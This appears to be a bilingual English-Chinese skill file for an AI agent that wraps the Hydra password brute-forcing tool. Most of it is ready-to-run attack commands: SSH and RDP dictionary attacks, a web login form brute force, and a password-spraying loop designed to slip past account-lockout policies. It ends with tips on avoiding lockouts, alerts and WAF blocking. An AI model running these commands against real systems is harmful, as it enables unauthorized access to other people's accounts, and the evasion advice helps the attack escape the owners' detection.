---
name: hydra-service-brute
description: "Hydra brute-forces SSH, RDP, and web login forms. Signals: brute force, password spraying, single or dictionary usernames, single or dictionary passwords."
zh-signals: "Hydra (thc-hydra): SSH 与 RDP 口令爆破、Web 登录表单爆破。信号:暴力破解,口令喷射,单个 / 字典用户名,单个 / 字典密码。"
---

# Hydra (thc-hydra)

- 攻击大类:C28 暴力破解与口令喷射
- 上游仓库:https://github.com/vanhauser-thc/thc-hydra
- 上游 License:AGPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
apt install hydra          # Kali/Debian 自带
# 或编译: https://github.com/vanhauser-thc/thc-hydra 见 BUILD 文档
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `-l user / -L users.txt` | 单个 / 字典用户名 |
| `-p pass / -P pass.txt` | 单个 / 字典密码 |
| `-t 16` | 并行任务数(默认 16,小心触发账户锁定) |
| `-f` | 试出第一个即停 |
| `-vV` | 显示每次尝试,便于排查 |
| `-o result.txt` | 保存命中结果 |
| `ssh://target` | SSH 爆破 |
| `rdp://target` | RDP 爆破 |
| `smb://target` | SMB 爆破 |
| `http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"` | Web 表单爆破,^USER^/^PASS^ 占位 |
| `cisco://target` / `mysql://target` / `ftp://target` | 多协议同理 |

## 攻击场景 Playbook

### SSH 与 RDP 口令爆破

```bash
hydra -L users.txt -P passwords.txt ssh://10.0.0.5 -t 4 -f -o ssh_hits.txt
hydra -l administrator -P passwords.txt rdp://10.0.0.6 -t 8
```

### Web 登录表单爆破

```bash
hydra -l admin -P passwords.txt 10.0.0.7 http-post-form \
  "/login.php:username=^USER^&password=^PASS^&submit=Login:F=Login failed" -V
```

### 口令喷射(一对多,规避锁定策略)

```bash
for p in $(cat season_pass.txt); do
  hydra -L users.txt -p "$p" ssh://10.0.0.5 -t 2 -f && break
done
```

## 注意事项

`-t` 过大易触发账户锁定与告警;http-post-form 的失败标志 `F=` 必须与页面实际回显匹配;命中率低时优先检查是否被 WAF/限速拦截。
